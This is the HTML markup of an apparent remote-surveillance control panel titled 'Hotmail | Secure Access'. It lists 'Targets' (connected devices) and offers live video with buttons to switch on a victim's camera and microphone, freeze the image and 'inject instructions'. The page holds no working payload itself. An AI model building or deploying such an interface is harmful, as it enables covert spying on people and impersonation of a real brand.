<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Hotmail | Secure Access</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="grid-container">
        <!-- الشريط الجانبي للأهداف -->
        <aside class="sidebar">
            <div class="logo">HOTMAIL <span>2099</span></div>
            <h3>الأجهزة المتصلة (Targets)</h3>
            <ul id="targets-list">
                <li class="empty">لا توجد أجهزة... بانتظار الاتصال</li>
            </ul>
        </aside>

        <!-- منطقة البث المباشر -->
        <main class="main-view">
            <div class="video-panel">
                <video id="remoteVideo" autoplay playsinline></video>
                <video id="localVideo" muted autoplay playsinline></video>
                <div class="overlay">
                    <span>LIVE FEED</span>
                </div>
            </div>

            <!-- وحدة البوت الذكي -->
            <div class="bot-control">
                <div class="bot-status">
                    <span class="pulse"></span> المساعد الذكي (Architect Bot)
                </div>
                <button id="btn-start-cam">📷 تفعيل الكاميرا</button>
                <button id="btn-start-mic">🎤 تفعيل الميكروفون</button>
                <button id="btn-freeze">❄️ تجميد الصورة</button>
                <button id="btn-inject">💉 حقن تعليمات</button>
            </div>
        </main>
    </div>
    <script src="/socket.io/socket.io.js"></script>
    <script src="app.js"></script>
</body>
</html>
